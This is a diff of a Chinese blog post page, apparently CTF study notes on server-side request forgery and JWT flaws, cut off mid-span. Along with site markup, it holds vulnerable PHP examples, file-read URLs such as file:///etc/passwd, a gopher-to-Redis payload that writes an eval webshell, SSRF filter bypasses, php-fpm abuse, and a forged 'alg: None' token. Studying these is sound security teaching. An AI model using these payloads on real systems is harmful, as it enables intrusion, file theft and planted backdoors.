@@ -1,101 +1,283 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>ssrf | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="SSRFServer-side Request Forgery 服务端请求伪造攻击向服务端发送包含恶意url连接的请求，借由服务端发起请求以便获取服务端网络内部的资源一句话总结：控制服务端使用指定协议访问指定的urlA：你为什么这么干？B：是谁谁谁让我干的A：谁谁谁让你去吃shi你去不去？特点：1 让别人访问我们访问不到的url2 拿到自己本来拿不到的数据 条件：1 别人能帮我访问url 服务端有">
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="uert">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SSRFServer-side Request Forgery 服务端请求伪造攻击向服务端发送包含恶意url连接的请求，借由服务端发起请求以便获取服务端网络内部的资源一句话总结：控制服务端使用指定协议访问指定的urlA：你为什么这么干？B：是谁谁谁让我干的A：谁谁谁让你去吃shi你去不去？特点：1 让别人访问我们访问不到的url2 拿到自己本来拿不到的数据 条件：1 别人能帮我访问url 服务端有">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ssrf">
 <meta property="og:url" content="https://theganlove.github.io/2024/09/01/ssrf/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="SSRFServer-side Request Forgery 服务端请求伪造攻击向服务端发送包含恶意url连接的请求，借由服务端发起请求以便获取服务端网络内部的资源一句话总结：控制服务端使用指定协议访问指定的urlA：你为什么这么干？B：是谁谁谁让我干的A：谁谁谁让你去吃shi你去不去？特点：1 让别人访问我们访问不到的url2 拿到自己本来拿不到的数据 条件：1 别人能帮我访问url 服务端有">
-<meta property="og:locale" content="en_US">
+<meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-09-01T12:49:09.000Z">
 <meta property="article:modified_time" content="2024-09-01T14:13:17.854Z">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
+<meta property="article:author" content="uert">
+<meta name="twitter:card" content="summary_large_image">
   
   
   
-<link rel="stylesheet" href="/css/style.css">
+  <title>ssrf - Hexo</title>
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"theganlove.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
   
 <meta name="generator" content="Hexo 7.3.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>主题</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ssrf"></span>
+          
+        </div>
+
         
-          <a class="main-nav-link" href="/">Home</a>
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-01 20:49" pubdate>
+          2024年9月1日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          6k 字
         
-      </nav>
-      <nav id="sub-nav">
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
         
         
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
         
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://theganlove.github.io"></form>
+          50 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
       </div>
+
+      
     </div>
   </div>
-</header>
+</div>
 
-      <div class="outer">
-        <section id="main"><article id="post-ssrf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/09/01/ssrf/" class="article-date">
-  <time class="dt-published" datetime="2024-09-01T12:49:09.000Z" itemprop="datePublished">2024-09-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      ssrf
-    </h1>
-  
+</div>
 
-      </header>
+  </header>
+
+  <main>
     
-    <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>Server-side Request Forgery 服务端请求伪造<br>攻击向服务端发送包含恶意url连接的请求，借由服务端发起请求<br>以便获取服务端网络内部的资源<br>一句话总结：<br>控制服务端使用指定协议访问指定的url<br>A：你为什么这么干？<br>B：是谁谁谁让我干的<br>A：谁谁谁让你去吃shi你去不去？<br>特点：<br>1 让别人访问我们访问不到的url<br>2 拿到自己本来拿不到的数据</p>
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ssrf</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>Server-side Request Forgery 服务端请求伪造<br>攻击向服务端发送包含恶意url连接的请求，借由服务端发起请求<br>以便获取服务端网络内部的资源<br>一句话总结：<br>控制服务端使用指定协议访问指定的url<br>A：你为什么这么干？<br>B：是谁谁谁让我干的<br>A：谁谁谁让你去吃shi你去不去？<br>特点：<br>1 让别人访问我们访问不到的url<br>2 拿到自己本来拿不到的数据</p>
 <p>条件：<br>1 别人能帮我访问url 服务端有接受url地址并进行访问的功能<br>2 url地址外部可控<br><a target="_blank" rel="noopener" href="https://xxx.com/index.php?url=http://www.baidu.com">https://xxx.com/index.php?url=http://www.baidu.com</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:&#x27;</span>.<span class="variable">$url</span>); <span class="comment">//302的跳转</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;location:&#x27;</span>.<span class="hljs-variable">$url</span>); <span class="hljs-comment">//302的跳转</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>是不是属于ssrf?</p>
 <p>告诉浏览器，你去访问这个地址<br>此时，浏览器，是客户端还是服务端</p>
@@ -103,7 +285,7 @@
 <p>此时，服务器没有访问这个Url,只是告诉你浏览器，去跳转到这个地址去<br>是浏览器去访问，不是服务端去访问<br>所以，不是SSRF<br>只能算 任意跳转漏<br>分清  是否是ssrf<br>url地址可控<br><a target="_blank" rel="noopener" href="http://10.xx.xx.xx/">http://10.xx.xx.xx/</a><br>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>URL格式<br>URI &#x3D; scheme:[&#x2F;&#x2F;authority]path[?query][#fragment]<br>schema: 协议头:&#x2F;&#x2F;authority [userinfo@]host[:port]</p>
 <p>默认使用80端口，而80端口默认情况下，是可以省略<br><a target="_blank" rel="noopener" href="http://www.baidu.com/robots.txt">http://www.baidu.com/robots.txt</a></p>
 <p>本质，就是 通过指定的协议，访问互联网上某台服务器的某个资源或者某个文件<br>默认使用匿名账户访问<br>userinfo: username:password@hos<br>schema:&#x2F;&#x2F;username:password@host:port&#x2F;path?a&#x3D;b#top<br><a target="_blank" rel="noopener" href="http://ctfshow:hacker@www.baidu.com/robots.txt">http://ctfshow:hacker@www.baidu.com/robots.txt</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="comment">//初始化一个cURL会话</span></span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">//设定返回信息中包含响应信息头</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//启用时会将头文件的信息作为数据流输出。 </span></span><br><span class="line"><span class="comment">//参数为1表示输出信息头,为0表示不输出</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//参数为1表示$result,为0表示echo $result</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//执行一个cURL会话</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="comment">//关闭一个curl会话</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-comment">//初始化一个cURL会话</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-comment">//设定返回信息中包含响应信息头</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//启用时会将头文件的信息作为数据流输出。 </span><br><span class="hljs-comment">//参数为1表示输出信息头,为0表示不输出</span><br> <br><span class="hljs-comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-comment">//参数为1表示$result,为0表示echo $result</span><br> <br><span class="hljs-comment">//执行一个cURL会话</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//关闭一个curl会话</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <h1 id="SSRF的利用面"><a href="#SSRF的利用面" class="headerlink" title="SSRF的利用面"></a>SSRF的利用面</h1><p><a target="_blank" rel="noopener" href="http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php">http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php">http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php</a></p>
 <h2 id="1-任意文件读取-前提是知道要读取的文件名"><a href="#1-任意文件读取-前提是知道要读取的文件名" class="headerlink" title="1 任意文件读取 前提是知道要读取的文件名"></a>1 任意文件读取 前提是知道要读取的文件名</h2><h2 id="2-探测内网资源"><a href="#2-探测内网资源" class="headerlink" title="2 探测内网资源"></a>2 探测内网资源</h2><p> 127.0.0.1 mysql服务端监听了127.0.0.1这个地址，也就表示，只能通过127.0.0.1这个IP来访问<br> 0.0.0.0 表示允许任意ip访问<br> 192.168.233.233 只允许特定的IP地址访问<br> 3 使用gopher协议扩展我们的攻击面<br> apache&#x2F;nginx 80<br> tomcat 8080<br> node 3000<br> flask 8080<br> php-fpm 9000<br> mysql 3306<br> ftp 21<br> ssh 22<br> redis 6379<br> key-value  gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;<em>save</em>&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php_<?php eval($_POST[1]);?><br> mysql 3306<br> 用户密码为空<br> php-fpm<br> php-fpm 默认监听9000端口，而且只允许本机127.0.0.1这个地址访问<br> 主要负责对.php文件的代码解释执行<br> 我们可以通过向9000端口发送格式的请求，来让9000端口背后的php-fpm帮我们处理我们提交的php代码<br> 通过向9000端口发送php执行请求<br> 设置php.ini中的运行参数<br> 其中使用 auto_append_file 来指定 php:&#x2F;&#x2F;input 包含恶意代码，然后执行<br> 为了能使用auto_append_file参数，必须有一个存在的php文件来使用这个配置项<br> php原生类进行ssrf<br>$soap &#x3D;new SoapClient($_GET[‘url’]);<br>$soap-&gt;hack();<br>&#x2F;&#x2F;$soap-&gt;__call()<br>url可控，可以发送内网请求<br>ssrf绕过<br>只要不允许它访问本地地址即可，也就是说，过滤的目的是，不让访问127.0.0.1地址<br>1 enclosed alphanumerics 绕过<br>127.0.0.1<br>127.⓿.⓿.1<br>2 使用IP地址转换<br>所有的域名-&gt;IP<br>ip可以使用不同进制来表示<br>127.0.0.1用不同进制可以表示为</p>
@@ -145,31 +327,31 @@
 <p>防止数据被篡改<br>1 对数据进行加密   内容对用户敏感，不需要对外<br>2 对数据进行签名   内容不敏感，但是确保不被篡改</p>
 <p>JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取<br>JSON Web Token JWT<br>?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改<br>?username&#x3D;admin&amp;score&#x3D;100&amp;token&#x3D;c17961f5f372f8cf039113909d715943<br>? md5(score&#x3D;100&amp;username&#x3D;admin)&#x3D;c17961f5f372f8cf039113909d715943<br>?score&#x3D;100&amp;username&#x3D;admin&amp;token&#x3D;c17961ff372f8cf039113909d715943<br>篡改数据的同时，破解了算法，篡改了签名<br>加盐机制，salt<br>md5(score&#x3D;100&amp;username&#x3D;admin_ctfshow)&#x3D;20f3fa445b286df3f1a518fcbcd8bbe2</p>
 <p>盐值有可能被爆破，也有可能被泄露<br>增加更高的密码算法，不再简单的md5，盐值也大幅度提高长度，达到几百上千位 来保证我们的数据不被篡改  或者即使篡改了我们能发现<br>由 Header、Payload、Signature三部分构成，用点分隔，数据采用Base64URL进行编码<br>Header是JWT的第一个部分，是一个 JSON 对象，主要声明了JWT的签名算法，如“HS256”、“RS256”等，以及其他可选参数，如“kid”等。<br>Header</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>Payload是JWT的第二个部分，这也是一个 JSON 对象，主要承载了各种声明并传递明文数据，一般用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明<br>Payload</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>Signature<br>    Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header的alg中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。<br>    Signature的功能是保护token完整性。<br>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。抽象成公式就是：signature &#x3D; HMAC-SHA256(base64urlEncode(header) + ‘.’ + base64urlEncode(payload), secret_key)<br>值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”&#x3D;”号，并将标准Base64中的”+”和”&#x2F;“分别改成了”-“和”_”。</p>
 <p>JWT生成-在线网址&amp;工具</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;secret_key&#x27;</span> -t <span class="string">&#x27;&#123;&quot;admin&quot;:True,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;secret_key&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;admin&quot;:True,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
 
 <h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>1 当不校验算法时，我们可以替换算法，甚至可以使用空的算法，来达到数据篡改目的</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;None&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;None&quot;</span><span class="punctuation">,</span><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span><span class="number">1673703091</span><span class="punctuation">,</span><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span><span class="number">1673710291</span><span class="punctuation">,</span><span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span><span class="number">1673703091</span><span class="punctuation">,</span><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;21a3d6eec9efbc030983fbc3650c0f03&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">ewogICAgImFsZyIgOiAiTm9uZSIsCiAgICAidHlwIiA6ICJqd3QiCn0=.ewogICAgInVzZXIiIDogImFkbWluIgp9</span><br></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;alg&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typ&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;jwt&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;user&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span 